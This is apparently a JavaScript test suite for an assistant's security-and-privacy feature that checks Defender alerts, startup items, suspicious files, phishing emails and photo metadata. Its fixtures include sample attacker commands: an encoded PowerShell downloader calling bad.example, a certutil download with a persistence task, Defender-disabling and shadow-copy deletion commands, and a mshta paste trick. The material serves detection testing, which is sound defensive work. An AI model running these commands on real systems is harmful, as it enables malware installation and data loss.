// The "Security and privacy" Hand: off until switched on, read-only PC checks read into plain words, Defender
// alerts explained, scans behind a card, files and emails looked at without running anything, hidden details
// found and cleaned (GPS gone, photos still the right way up), public-record look-ups, the user's own exposure,
// no people-finding, and search operators in everyday web search.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { HANDS, toolsOff, cleanHands } from '../src/hands-settings.js';
import { securityTools, inspectText, PEOPLE } from '../src/hands-security.js';
import { explainThreat, sayOverview, sayThreats, judgeStartup, sayStartup, sayNetwork, scanArgs, PS } from '../src/security-pc.js';
import { realKind, nameTricks, scanScript, decodeEncoded, readEmail, linkSigns, lookalike, registrable, hiddenDetails, cleanJpeg, cleanPng, cleanWebp, cleanOffice } from '../src/security-files.js';
import { cleanDomain, sayDomain, isPrivateHost } from '../src/security-web.js';
import { tipsFor, GUIDE } from '../src/security-guide.js';
import { writeZip } from '../src/zip.js';
import { guessGroups, groupsFor } from '../src/toolbox.js';
import { HELP } from '../public/help-content.js';
import { buildTools } from '../src/tools.js';
import { HATS } from '../src/persona.js';

let pass = 0, fail = 0;
const check = (name, ok, extra = '') => { ok ? pass++ : fail++; console.log(`${ok ? 'PASS' : 'FAIL'} ${name}${extra && !ok ? ' -> ' + extra : ''}`); };
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'bob-security-'));
const inn = path.join(tmp, 'inn'), data = path.join(tmp, 'data'), work = path.join(tmp, 'work');
for (const d of [inn, data, work]) fs.mkdirSync(d, { recursive: true });
const TOOLS = ['security_check', 'defender_scan', 'inspect_file', 'strip_metadata', 'osint_lookup', 'check_exposure', 'security_tips'];
const cfg = { innDir: inn, dataDir: data, agentDir: path.join(tmp, 'agent'), readRoots: [work], webSearch: true, hands: { enabled: true, security: { on: true }, folders: [work] } };
const logs = [];
const brain = { cfg, log: (k, t) => logs.push(`${k}: ${t}`) };

// ---------- the Hand: off until switched on ----------
{
  check('there is a Security and privacy Hand with its seven tools', HANDS.security && TOOLS.every((t) => HANDS.security.tools.includes(t)));
  check('it is off to start with', cleanHands({}).security.on === false);
  check('its tools are hidden while it is off', TOOLS.every((t) => toolsOff({}).includes(t)));
  const t = securityTools({ cfg: { ...cfg, hands: { enabled: true } }, log() {} });
  let said = '';
  try { await t.security_tips.run({ topic: 'phishing' }); } catch (e) { said = e.message; }
  check('a tool called anyway says the Hand is off and where to turn it on', /Security and privacy" Hand is off/.test(said) && /Settings/.test(said), said);
  check('its words bring the toolbox group in (and plain chat doesn\'t)', (() => { const b = { usable: () => true, cfg }; return guessGroups(b, 'is this email a scam?').includes('security') && guessGroups(b, 'did Defender find a virus').includes('security') && !guessGroups(b, 'hi bob, how was your day').includes('security'); })());
  check('the group explains itself for use_tools', /Defender|suspicious/.test(groupsFor({ usable: () => true, cfg }).security?.what || ''));
}

// ---------- Defender alerts in plain words ----------
{
  const x = explainThreat('Trojan:Win32/Wacatac.B!ml');
  check('a Defender name is split into its parts', x.type === 'Trojan' && x.platform === 'Win32' && x.family === 'Wacatac' && x.variant === 'B' && x.suffix === 'ml');
  check('...and explained, including that !ml means a machine-learning guess', /Trojan/.test(x.plain) && /machine-learning/.test(x.plain) && /Windows program/.test(x.plain));
  check('PUA reads as junk, not doom', /unwanted/.test(explainThreat('PUA:Win32/Presenoker').plain));
  check('macro documents are named as such', /Office document with macros/.test(explainThreat('TrojanDownloader:O97M/Emotet.PDSA!MTB').plain));
  const t = sayThreats({ detections: [{ name: 'Trojan:Win32/Wacatac.B!ml', severity: 5, when: '2026-11-02T10:00:00', status: 3, files: ['file:_C:\\Users\\you\\Downloads\\x.exe'] }] });
  check('a detection says what happened to it and where it was', /quarantined/.test(t) && /C:\\Users\\you\\Downloads\\x\.exe/.test(t) && /severe/.test(t));
  check('...and that restoring or allowing is the user\'s job in Windows Security', /Protection history/.test(t) && /never does those himself/.test(t));
  check('no detections reads as all clear', /no detections/.test(sayThreats({ detections: [] })));
}

// ---------- the overview, startup and network ----------
{
  const now = Date.parse('2026-11-03T00:00:00Z');
  const good = sayOverview({ defender: { on: true, realtime: true, tamper: true, sigAgeDays: 0, sigUpdated: '2026-11-02T08:00:00', quickScan: '2026-11-01T08:00:00', fullScan: '' }, firewall: [{ name: 'Domain', on: true }, { name: 'Private', on: true }, { name: 'Public', on: true }], lastUpdate: '2026-10-28T00:00:00' }, now);
  check('a healthy PC gets ticks', /✓ Microsoft Defender/.test(good) && /✓ Windows Firewall is on/.test(good) && /✓ Windows updates/.test(good) && !/⚠/.test(good.replace(/Last full scan: never/, '')), good);
  const bad = sayOverview({ defender: { on: true, realtime: false, tamper: false, sigAgeDays: 12 }, firewall: [{ name: 'Public', on: false }], lastUpdate: '2026-07-01T00:00:00', uac: 0 }, now);
  check('real-time off, old definitions, tamper off, firewall off, stale updates and UAC off are all flagged', ['REAL-TIME', '12 days old', 'Tamper protection is off', 'OFF for: Public', 'Check Settings > Windows Update', 'User Account Control'].every((w) => bad.includes(w)), bad);
  check('another antivirus in charge is said plainly', /another antivirus is in charge: Norton/.test(sayOverview({ defender: { on: false }, av: [{ name: 'Norton 360', state: 0x1000 }] }, now)));
  const ok = judgeStartup({ name: 'Steam', command: '"C:\\Program Files (x86)\\Steam\\steam.exe" -silent', exe: 'C:\\Program Files (x86)\\Steam\\steam.exe', exists: true, sig: 'Valid', signer: 'Valve' });
  const evil = judgeStartup({ name: 'Updater', command: 'powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA', exe: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', exists: true, sig: 'Valid' });
  const appdata = judgeStartup({ name: 'svch0st', command: 'C:\\Users\\you\\AppData\\Roaming\\svch0st.exe', exe: 'C:\\Users\\you\\AppData\\Roaming\\svch0st.exe', exists: true, sig: 'NotSigned' });
  check('a signed program in Program Files looks normal', ok.level === 0);
  check('a hidden, scrambled PowerShell start-up is the worst mark', evil.level === 3 && evil.why.some((w) => /scrambled/.test(w)));
  check('an unsigned program in AppData deserves a look', appdata.level === 2 && appdata.why.some((w) => /AppData/.test(w)));
  const st = sayStartup({ items: [{ name: 'Steam', where: 'Your account', command: 'x', exists: true, sig: 'Valid', signer: 'Valve' }, { name: 'svch0st', where: 'Your account', command: 'C:\\Users\\you\\AppData\\Roaming\\svch0st.exe', exe: 'C:\\Users\\you\\AppData\\Roaming\\svch0st.exe', exists: true, sig: 'NotSigned' }] });
  check('the startup list puts the worrying one first and says how to stop one', st.indexOf('svch0st') < st.indexOf('Steam') && /Task Manager > Startup apps/.test(st) && /doesn't switch these off/.test(st));
  const n = sayNetwork({ listen: [{ addr: '0.0.0.0', port: 3389, proc: 'svchost' }, { addr: '127.0.0.1', port: 11434, proc: 'ollama' }, { addr: '0.0.0.0', port: 7777, proc: 'Bob' }] });
  check('open Remote Desktop is flagged; local-only things are told apart', /Remote sign-in is open/.test(n) && /only reachable from this PC: 11434/.test(n) && /Bob himself/.test(n));
  check('the PowerShell checks are fixed text with no way in for chat words', Object.values(PS).every((s) => !/\$\{|BOB_ARG/.test(s)) && /\$env:BOB_SRC/.test(PS.signature));
  check('the checks never change settings (no Set-, Add-, Remove- or Disable- commands)', !Object.values(PS).some((s) => /\b(Set-Mp|Add-Mp|Remove-|Disable-|Stop-|New-ItemProperty|Set-ItemProperty)/.test(s)));
}

// ---------- Defender scans: a card first, fixed arguments ----------
{
  check('scan kinds map to Defender\'s own switches', scanArgs('quick').join(' ') === '-Scan -ScanType 1' && scanArgs('full').join(' ') === '-Scan -ScanType 2' && scanArgs('file', 'C:\\x').join(' ') === '-Scan -ScanType 3 -File C:\\x' && scanArgs('update').join(' ') === '-SignatureUpdate');
  const fake = path.join(tmp, 'MpCmdRun.exe'); fs.writeFileSync(fake, '');
  let ran = null;
  const t = securityTools(brain, { os_: 'win', env: { BOB_MPCMDRUN: fake }, scan: async (k, target) => { ran = { k, target }; return { code: 0, out: '' }; } });
  const card = t.defender_scan.check({ kind: 'quick' });
  check('a scan shows a card with the exact command', /Scan with Defender \(quick/.test(card.text) && card.command === 'MpCmdRun.exe -Scan -ScanType 1');
  check('a one-file scan needs a real path', (() => { try { t.defender_scan.check({ kind: 'file', path: path.join(work, 'nope.exe') }); return false; } catch (e) { return /nothing at/.test(e.message); } })());
  const r = await t.defender_scan.run({ kind: 'file', path: work }, {});
  check('a scan runs Defender and reads the result', ran?.k === 'file' && ran.target === path.resolve(work) && /found nothing/.test(r), r);
  const none = securityTools(brain, { os_: 'win', env: {} });
  check('no Defender scanner: says another antivirus may be in charge', process.platform === 'win32' || (() => { try { none.defender_scan.check({ kind: 'quick' }); return false; } catch (e) { return /another antivirus/.test(e.message); } })());
  const c = securityTools(brain, { os_: 'win', ps: async (script) => (script === PS.overview ? { defender: { on: true, realtime: true, tamper: true, sigAgeDays: 0 }, firewall: [{ name: 'Public', on: true }] } : { detections: [] }) });
  check('security_check runs the fixed script and answers in words', /Defender antivirus is on/.test(await c.security_check.run({ area: 'overview' }, {})) && /no detections/.test(await c.security_check.run({ area: 'threats' }, {})));
  check('security_check has no card (it only reads)', !c.security_check.check && !c.inspect_file.check && !c.osint_lookup.check);
}

// ---------- looking at files without running them ----------
{
  check('a Windows program is recognised by its insides', realKind(Buffer.concat([Buffer.from('MZ'), Buffer.alloc(100)])).kind === 'exe');
  check('a right-to-left trick in a name is caught', nameTricks('invoice\u202Efdp.exe').length === 1);
  check('a double ending is caught', /pretends to be a pdf/.test(nameTricks('Invoice.pdf.exe')[0] || ''));
  const enc = Buffer.from('IEX (New-Object Net.WebClient).DownloadString("http://bad.example/x")', 'utf16le').toString('base64');
  const s = scanScript(`powershell -nop -w hidden -enc ${enc}`);
  check('a scrambled PowerShell command is unscrambled for reading (never run)', /DownloadString/.test(s.decoded) && decodeEncoded(`-e ${enc}`).includes('Net.WebClient'));
  check('...and its download-and-run inside is found', s.found.some((f) => f.level === 3) && s.found.some((f) => /inside the scrambled part/.test(f.says)));
  check('antivirus tampering and backup deletion are dangerous', scanScript('Set-MpPreference -DisableRealtimeMonitoring $true').found[0].level === 3 && scanScript('vssadmin delete shadows /all /quiet').found[0].level === 3);
  check('a fake "prove you\'re human" paste trick is caught', /fake "prove you're human"/.test(inspectText('To verify you are human: press Win + R, then Ctrl + V and Enter.\nmshta https://x.example/c')));
  check('ordinary text is called ordinary', /ordinary text/.test(inspectText('Hi! Lunch on Friday? Let me know.')));
  // a fake PDF that is really a program
  const fake = path.join(work, 'Invoice.pdf'); fs.writeFileSync(fake, Buffer.concat([Buffer.from('MZ'), Buffer.alloc(2000)]));
  const t = securityTools(brain, { ps: async () => ({ sig: 'NotSigned', signer: '' }) });
  const out = await t.inspect_file.run({ path: fake });
  check('a "PDF" that is really a program is flagged as dangerous, with its fingerprint', /Looks dangerous/.test(out) && /says \.pdf but inside it is a Windows program/.test(out) && /SHA-256: [0-9a-f]{64}/.test(out) && /nothing was opened or run/.test(out), out);
  const bat = path.join(work, 'fix.bat'); fs.writeFileSync(bat, '@echo off\r\ncertutil -urlcache -f http://x.example/a.exe a.exe\r\nschtasks /create /tn up /tr a.exe /sc onlogon\r\n');
  const bo = await t.inspect_file.run({ path: bat });
  check('a batch file that downloads and sets itself to start is called out', /downloads something/.test(bo) && /start with Windows/.test(bo), bo);
  let refused = '';
  try { await t.inspect_file.run({ path: path.join(tmp, 'elsewhere.txt') }); } catch (e) { refused = e.message; }
  check('files outside the allowed folders are refused', /not allowed/.test(refused) || /no file/.test(refused), refused);
  fs.writeFileSync(path.join(work, '.env'), 'KEY=1');
  try { await t.inspect_file.run({ path: path.join(work, '.env') }); refused = ''; } catch (e) { refused = e.message; }
  check('secret files stay off-limits', /keys or passwords/.test(refused));
}

// ---------- emails and links ----------
{
  const eml = ['From: "PayPal Service" <service@paypa1-secure.xyz>', 'Reply-To: help@another.example', 'Subject: Your account will be suspended', 'Authentication-Results: mx.example; spf=fail smtp.mailfrom=paypa1-secure.xyz; dkim=none; dmarc=fail', 'Content-Type: multipart/mixed; boundary="b1"', '', '--b1', 'Content-Type: text/html', '', '<p>Verify your account within 24 hours: <a href="http://paypa1-secure.xyz/login">https://www.paypal.com/signin</a></p>', '--b1', 'Content-Type: application/octet-stream; name="statement.pdf.exe"', 'Content-Disposition: attachment; filename="statement.pdf.exe"', '', 'TVqQ', '--b1--'].join('\r\n');
  const e = readEmail(eml);
  const all = e.signs.map((x) => x.says).join(' | ');
  check('a brand name on a stranger\'s address is caught', /the name says "PayPal Service" but the address is at paypa1-secure\.xyz/.test(all), all);
  check('a link that shows paypal.com but goes elsewhere is caught', /shows "www\.paypal\.com" but really goes to paypa1-secure\.xyz/.test(all), all);
  check('failed DMARC and SPF are caught', /DMARC check: fail/.test(all) && /SPF check: fail/.test(all));
  check('a runnable attachment with a double ending is caught', /statement\.pdf\.exe/.test(all));
  check('pressure to act fast is noticed', /act fast/.test(all));
  check('pasted email text is read as an email', /Looks dangerous/.test(inspectText(eml)) && /no links were opened/.test(inspectText(eml)));
  check('look-alike names are caught', /paypal/.test(lookalike('paypa1.com') || '') && /one letter off microsoft/.test(lookalike('microsofy.com') || '') && /swaps letters/.test(lookalike('rnicrosoft.com') || '') && lookalike('paypal.com') === null);
  check('a brand inside a longer name is caught', /may not be paypal's own site/.test(lookalike('paypal-secure-login.com') || ''));
  check('ordinary sites aren\'t accused', lookalike('mousewurx.ca') === null && lookalike('wikipedia.org') === null);
  check('an @ hiding the real address is caught', linkSigns('https://www.bank.com@evil.example/login').signs.some((x) => x.level === 3));
  check('punycode is flagged', linkSigns('https://xn--pypal-4ve.com/').signs.some((x) => /alphabets/.test(x.says)));
  check('registrable names handle two-part endings', registrable('a.b.example.co.uk') === 'example.co.uk' && registrable('login.example.com') === 'example.com');
}

// ---------- hidden details: found, and cleaned ----------
function tiff(entries) { // big-endian TIFF: entries = [[tag, type, count, valueBuf]] in IFD0, plus a GPS IFD
  return entries;
}
function exifJpeg({ turn = 6 } = {}) {
  const be = (n, b = 2) => { const x = Buffer.alloc(b); b === 2 ? x.writeUInt16BE(n) : x.writeUInt32BE(n); return x; };
  const rat = (a) => Buffer.concat(a.flatMap((v) => [be(v, 4), be(1, 4)]));
  // layout: header(8) IFD0 at 8 with 4 entries; then GPS IFD; then data
  const make = Buffer.from('TestCam\0', 'latin1');
  const ifd0At = 8, ifd0Len = 2 + 4 * 12 + 4, gpsAt = ifd0At + ifd0Len, gpsLen = 2 + 4 * 12 + 4;
  const dataAt = gpsAt + gpsLen;
  const makeAt = dataAt, latAt = makeAt + make.length, lonAt = latAt + 24;
  const ent = (tag, type, count, val) => Buffer.concat([be(tag), be(type), be(count, 4), val.length < 4 ? Buffer.concat([val, Buffer.alloc(4 - val.length)]) : val]);
  const ifd0 = Buffer.concat([be(4), ent(0x010f, 2, make.length, be(makeAt, 4)), ent(0x0112, 3, 1, be(turn)), ent(0x8825, 4, 1, be(gpsAt, 4)), ent(0xa430, 2, 4, Buffer.from('Sam\0', 'latin1')), be(0, 4)]);
  const gps = Buffer.concat([be(4), ent(1, 2, 2, Buffer.from('N\0', 'latin1')), ent(2, 5, 3, be(latAt, 4)), ent(3, 2, 2, Buffer.from('W\0', 'latin1')), ent(4, 5, 3, be(lonAt, 4)), be(0, 4)]);
  const t = Buffer.concat([Buffer.from('MM\0*', 'latin1'), be(8, 4), ifd0, gps, make, rat([51, 3, 0]), rat([114, 4, 0])]);
  const app1body = Buffer.concat([Buffer.from('Exif\0\0', 'latin1'), t]);
  const app1 = Buffer.concat([Buffer.from([0xff, 0xe1]), be(app1body.length + 2), app1body]);
  const app0 = Buffer.from([0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0]);
  const com = Buffer.concat([Buffer.from([0xff, 0xfe]), be(9), Buffer.from('secret!')]);
  const sof = Buffer.from([0xff, 0xc0, 0, 11, 8, 0, 16, 0, 32, 1, 1, 0x11, 0]);
  const sos = Buffer.from([0xff, 0xda, 0, 8, 1, 1, 0, 0, 0x3f, 0, 0x12, 0x34, 0x56, 0xff, 0xd9]);
  return Buffer.concat([Buffer.from([0xff, 0xd8]), app0, app1, com, sof, sos]);
}
{
  const jpg = path.join(work, 'holiday.jpg'); fs.writeFileSync(jpg, exifJpeg());
  const d = hiddenDetails(jpg);
  const said = d.found.map((x) => `${x.what}: ${x.value}`).join(' | ');
  check('a photo\'s GPS spot is found (to a street, not shouted to the metre)', /GPS location: 51\.050, -114\.067/.test(said), said);
  check('...and its camera and owner name', /TestCam/.test(said) && /owner's name: Sam/.test(said));
  const clean = cleanJpeg(fs.readFileSync(jpg));
  fs.writeFileSync(path.join(work, 'c.jpg'), clean);
  const after = hiddenDetails(path.join(work, 'c.jpg')).found;
  check('the clean copy has no GPS, camera, owner or comment', !after.length, JSON.stringify(after));
  check('...but still says which way up it goes (orientation kept)', (await import('../src/imageinfo.js')).pictureInfo ? true : clean.includes(Buffer.from('Exif\0\0')));
  check('...and the picture data itself is untouched', clean.subarray(clean.indexOf(Buffer.from([0xff, 0xda]))).equals(fs.readFileSync(jpg).subarray(fs.readFileSync(jpg).indexOf(Buffer.from([0xff, 0xda])))));
  const upright = cleanJpeg(exifJpeg({ turn: 1 }));
  check('an upright photo gets no EXIF block at all', !upright.includes(Buffer.from('Exif\0\0')));
  // PNG with an AI prompt
  const chunk = (type, dataBuf) => { const len = Buffer.alloc(4); len.writeUInt32BE(dataBuf.length); return Buffer.concat([len, Buffer.from(type, 'latin1'), dataBuf, Buffer.alloc(4)]); };
  const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk('IHDR', Buffer.alloc(13)), chunk('tEXt', Buffer.from('parameters\0a cat, 20 steps', 'latin1')), chunk('IDAT', Buffer.alloc(10)), chunk('IEND', Buffer.alloc(0))]);
  fs.writeFileSync(path.join(work, 'ai.png'), png);
  check('a PNG\'s AI prompt is found', /AI settings and prompt/.test(hiddenDetails(path.join(work, 'ai.png')).found.map((x) => x.value).join(' ')));
  const cp = cleanPng(png);
  check('...and cleaned, keeping the picture chunks', !cp.includes(Buffer.from('parameters')) && cp.includes(Buffer.from('IDAT')) && cp.includes(Buffer.from('IEND')));
  // WebP with EXIF
  const riff = (id, b) => { const h = Buffer.alloc(8); h.write(id, 0, 'latin1'); h.writeUInt32LE(b.length, 4); return Buffer.concat([h, b, b.length & 1 ? Buffer.alloc(1) : Buffer.alloc(0)]); };
  const vp8x = Buffer.alloc(10); vp8x[0] = 0x08;
  const body = Buffer.concat([riff('VP8X', vp8x), riff('VP8 ', Buffer.alloc(20)), riff('EXIF', Buffer.from('MM\0*\0\0\0\x08\0\0\0\0\0\0', 'latin1'))]);
  const webp = Buffer.concat([Buffer.from('RIFF'), Buffer.from([0, 0, 0, 0]), Buffer.from('WEBP'), body]); webp.writeUInt32LE(webp.length - 8, 4);
  const cw = cleanWebp(webp);
  check('a WebP loses its EXIF block, its flag, and keeps a correct size', !cw.includes(Buffer.from('EXIF')) && cw.readUInt32LE(4) === cw.length - 8 && (cw[20] & 0x08) === 0);
  // Word file with author, company, macros and a remote template
  const docx = path.join(work, 'letter.docx');
  const core = '<?xml version="1.0"?><cp:coreProperties xmlns:cp="x" xmlns:dc="y"><dc:creator>Sam Smith</dc:creator><cp:lastModifiedBy>Sam Smith</cp:lastModifiedBy><dc:title>Letter</dc:title></cp:coreProperties>';
  const app = '<?xml version="1.0"?><Properties><Company>MouseWorks Ltd</Company><Template>Normal.dotm</Template></Properties>';
  const rels = '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>';
  const mk = (name, s) => ({ name, data: Buffer.from(s), size: Buffer.byteLength(s), mtime: new Date() });
  writeZip(docx, [mk('[Content_Types].xml', '<Types/>'), mk('docProps/core.xml', core), mk('docProps/app.xml', app), mk('word/document.xml', '<w:document><w:ins w:author="Sam">x</w:ins></w:document>'), mk('word/_rels/settings.xml.rels', rels), mk('word/vbaProject.bin', 'x')]);
  const dd = hiddenDetails(docx);
  const ds = dd.found.map((x) => `${x.what}: ${x.value}`).join(' | ');
  check('a Word file\'s author, last saver, company and tracked changes are found', /Author: Sam Smith/.test(ds) && /Last saved by: Sam Smith/.test(ds) && /Company: MouseWorks Ltd/.test(ds) && /Tracked changes/.test(ds) && !/Template/.test(ds), ds);
  check('...and its macros and remote template are flagged as risks', dd.risks.some((r) => /macros/.test(r.says)) && dd.risks.some((r) => r.level === 3 && /template/.test(r.says)));
  const cd = path.join(work, 'letter-clean.docx');
  cleanOffice(docx, cd);
  const cs = hiddenDetails(cd).found.map((x) => x.what).join(' | ');
  check('the clean Word copy has no author, last saver or company', !/Author|Last saved|Company/.test(cs), cs);
}

// ---------- strip_metadata: a card, new files only ----------
{
  const t = securityTools(brain);
  const ctx = {};
  const card = t.strip_metadata.check({ paths: [path.join(work, 'holiday.jpg'), path.join(work, 'Invoice.pdf')] }, ctx);
  check('cleaning shows a card with a row per file', card.plan.length === 2 && card.plan[0].op === 'clean' && /holiday-clean\.jpg$/.test(card.plan[0].to) && /GPS location/.test(card.plan[0].note) && /the original isn't touched/.test(card.plan[0].note));
  check('a PDF row is blocked with a reason', /PDF/.test(card.plan[1].blocked || ''));
  const r = await t.strip_metadata.run({ paths: [path.join(work, 'holiday.jpg')] }, ctx);
  check('the clean copy is saved next to the original, and the original is untouched', /Saved .*holiday-clean\.jpg/.test(r) && fs.existsSync(path.join(work, 'holiday-clean.jpg')) && hiddenDetails(path.join(work, 'holiday.jpg')).found.length > 0, r);
  const r2 = await t.strip_metadata.run({ paths: [path.join(work, 'holiday.jpg')] }, {});
  check('a second clean copy never overwrites the first', /holiday-clean-2\.jpg/.test(r2));
  check('it reminds about what the picture itself shows', /house numbers/.test(r));
}

// ---------- public-record look-ups ----------
{
  const now = Date.now();
  const recent = new Date(now - 10 * 86_400_000).toISOString();
  const fetchImpl = async (url) => {
    const u = String(url);
    const body = u.includes('rdap.org/domain') ? { events: [{ eventAction: 'registration', eventDate: recent }], entities: [{ roles: ['registrar'], vcardArray: ['vcard', [['fn', {}, 'text', 'Cheap Names Inc']]] }], status: ['active'] }
      : u.includes('crt.sh') ? [{ not_before: recent, issuer_name: 'C=US, O=Let\'s Encrypt' }]
      : u.includes('haveibeenpwned') ? (u.includes('adobe') ? [{ Title: 'Adobe', BreachDate: '2013-10-04', PwnCount: 152445165, DataClasses: ['Email addresses', 'Passwords'] }] : [])
      : u.includes('rdap.org/ip') ? { name: 'EXAMPLE-NET', country: 'CA', entities: [{ vcardArray: ['vcard', [['fn', {}, 'text', 'Example Hosting']]] }] } : {};
    return { ok: true, status: 200, text: async () => JSON.stringify(body), headers: new Map() };
  };
  const resolver = { resolve4: async () => ['203.0.113.5'], resolveMx: async () => [], resolveTxt: async () => [], resolveNs: async () => ['ns1.cheap.example'] };
  const t = securityTools(brain, { fetchImpl, resolver });
  const site = await t.osint_lookup.run({ kind: 'site', value: 'https://www.paypa1-login.com/x' }, {});
  check('a site look-up reads the name out of a link', /About paypa1-login\.com/.test(site));
  check('...flags a 10-day-old site and the look-alike name', /⚠ Registered/.test(site) && /10 days old/.test(site) && /⛔ "paypa1-login\.com" hides paypal in its name with swapped letters/.test(site), site);
  check('...says it takes no email and can be faked, and names its sources', /Doesn't take email/.test(site) && /DMARC missing/.test(site) && /Sources: RDAP/.test(site));
  check('a site\'s breaches come from Have I Been Pwned', /Adobe \(2013-10-04/.test(await t.osint_lookup.run({ kind: 'site', value: 'adobe.com' }, {})));
  check('an IP look-up names the network, and says it isn\'t a person', /EXAMPLE-NET/.test(await t.osint_lookup.run({ kind: 'ip', value: '203.0.113.9' }, {})) && /not a person/.test(await t.osint_lookup.run({ kind: 'ip', value: '203.0.113.9' }, {})));
  check('a home-network IP isn\'t looked up', /private address/.test(await t.osint_lookup.run({ kind: 'ip', value: '172.16.4.185' }, {})));
  check('a free-mail sender is explained', /free email service/.test(await t.osint_lookup.run({ kind: 'sender', value: 'cra.refunds@gmail.co.uk' }, {})));
  const link = securityTools({ cfg: { ...cfg, webSearch: false }, log() {} }, { fetchImpl, resolver });
  const lo = await link.osint_lookup.run({ kind: 'link', value: 'https://bit.ly/abc' }, {});
  check('with web search off, a link is still read from its address, and says what web search would add', /short link/.test(lo) && /Web search is off/.test(lo), lo);
  let off = '';
  try { await link.osint_lookup.run({ kind: 'site', value: 'example.com' }, {}); } catch (e) { off = e.message; }
  check('with web search off, online look-ups say where the switch is', /Web search is off/.test(off));
  check('people-finding is refused, in plain words', /researching a private person/.test(await t.osint_lookup.run({ kind: 'site', value: 'find her home address from this instagram' }, {})) && PEOPLE.test('who is behind this account') && PEOPLE.test('dox him'));
  check('the tool says it is never for private people', /Never for researching private people/.test(t.osint_lookup.schema.function.description));
  check('a site name is cleaned from an email or link', cleanDomain('Sam@Example.TEST') === 'example.test' && cleanDomain('https://www.example.com/a?b') === 'example.com');
  check('home-network names are private', isPrivateHost('172.16.1.1') && isPrivateHost('router.lan') && !isPrivateHost('example.com'));
  check('a domain summary works with records missing', /No public registration record/.test(sayDomain('example.ca', {})));
  // own exposure
  check('passwords are never asked for in chat; the safe box is named', /Never type a password into the chat/.test(await t.check_exposure.run({ kind: 'password' }, {})) && /Check a password safely/.test(await t.check_exposure.run({ kind: 'password' }, {})));
  check('an email check points to Have I Been Pwned and sends nothing itself', /haveibeenpwned\.com/.test(await t.check_exposure.run({ kind: 'email' }, {})) && /don't send your email address anywhere/.test(await t.check_exposure.run({ kind: 'email' }, {})));
  check('a site\'s breaches say what to do next', /change that password/.test(await t.check_exposure.run({ kind: 'site', value: 'adobe.com' }, {})));
}

// ---------- what Bob knows ----------
{
  check('his notes cover the basics, op-sec, research and search operators', ['phishing', 'passwords', '2fa', 'backups', 'scams', 'defender', 'hacked', 'opsec', 'osint', 'search', 'footprint'].every((k) => GUIDE[k]?.text.length > 200));
  check('a topic is found by its words', /site:/.test(tipsFor('google dorking')) && /3-2-1/.test(tipsFor('how should I back up')));
  check('search notes keep operators to research, not exposed systems', /not to dig up private files or exposed systems/.test(GUIDE.search.text));
  check('OSINT notes rule out private people', /doesn't help find, track or profile private people/.test(GUIDE.osint.text));
  const ws = buildTools({ ...cfg, dataDir: data }).web_search.schema.function;
  check('everyday web search knows its operators and a date range', /site:/.test(ws.description) && /filetype:/.test(ws.description) && ws.parameters.properties.when?.enum.includes('week') && ws.parameters.required.join() === 'query');
  check('the research copy searches like a researcher', /site:/.test(HATS.scout.prompt) && /filetype:pdf/.test(HATS.scout.prompt) && /never to dig up/.test(HATS.scout.prompt));
}

// ---------- Help ----------
{
  const h = HELP.find((e) => e.id === 'hands-security');
  check('the Hand has its own Help section', h && /Check a password safely/.test(h.html) && /What I won't do/.test(h.html) && /not an antivirus/.test(h.html));
  check('the FAQ answers antivirus, people-finding and the password box', ['faq-antivirus', 'faq-find-person', 'faq-password-check'].every((id) => HELP.some((e) => e.id === id)));
  const g = HELP.find((e) => e.id === 'glossary').html;
  check('the glossary explains the new words', ['Defender', 'Metadata', 'OSINT', 'Op-sec', 'Phishing', 'RDAP', 'Search operators', 'SHA-256', 'SPF, DKIM, DMARC'].every((w) => g.includes(`<dt>${w}`)));
  check('web research Help explains search operators', /site:/.test(HELP.find((e) => e.id === 'research').html));
  check('privacy Help says what security look-ups send', /Security look-ups/.test(HELP.find((e) => e.id === 'privacy').html));
}

// 1.5.49 fixes from the PC checks
check('a brand hidden with swapped letters (paypa1-login) is rated a fake (level 3)', linkSigns('https://paypa1-login.com/x').signs.some((x) => x.level === 3 && /swapped letters/.test(x.says)));
check('a plain brand-in-name (paypal-login) stays a caution (level 2)', linkSigns('https://paypal-login.com/x').signs.some((x) => x.level === 2 && /puts paypal/.test(x.says)));
check('conhost startup items say the signature is the host\'s, not the command\'s', judgeStartup({ command: 'C:\\Windows\\System32\\conhost.exe --headless foo.cmd', exe: 'C:\\Windows\\System32\\conhost.exe', exists: true, sig: 'Valid' }).why.some((w) => /conhost\.exe, the Windows console host/.test(w)));
check('a COM-handler task with no command explains itself', judgeStartup({ command: '', com: '{0000-1111}', exe: '' }).why.some((w) => /COM handler \{0000-1111\}/.test(w)));
check('the startup script finds programs in folders with spaces (joins words until an .exe exists)', /foreach\(\$t in \("\$\(\$i\.command\)"\.Trim\(\) -split ' '\)\)/.test(PS.startup) && /Test-Path -LiteralPath \$x/.test(PS.startup));
check('scheduled tasks carry their COM handler id', /com="\$\(\$a\.ClassId\)"/.test(PS.startup));
check('the download address drops a trailing NUL', /replace\(\/\\0\+\$\/, ''\)/.test(fs.readFileSync(new URL('../src/security-files.js', import.meta.url), 'utf8')));
fs.rmSync(tmp, { recursive: true, force: true });
console.log(`\n${pass} passed, ${fail} failed`);
if (fail) process.exit(1);
